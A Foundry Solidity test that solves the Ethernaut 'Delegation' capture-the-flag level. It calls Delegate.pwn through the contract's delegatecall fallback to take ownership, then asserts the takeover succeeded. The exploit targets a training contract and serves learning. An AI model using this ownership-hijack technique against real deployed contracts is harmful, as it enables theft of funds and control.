// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.17;

import {Test, console2} from "forge-std/Test.sol";

import {Delegation, Delegate} from "ethernaut/levels/Delegation.sol";
import {DelegationFactory} from "ethernaut/levels/DelegationFactory.sol";

contract DelegationTest is Test {
    DelegationFactory factory = new DelegationFactory();
    Delegation public victim;

    address public attacker = address(this);

    function setUp() public {
        victim = Delegation(factory.createInstance(attacker));
    }

    function testAttack() external {
        assertEq(victim.owner(), address(factory));

        bytes memory calldatas = abi.encodeCall(Delegate.pwn, ());
        (bool success,) = address(victim).call(calldatas);
        require(success);

        assertEq(victim.owner(), attacker);
    }
}
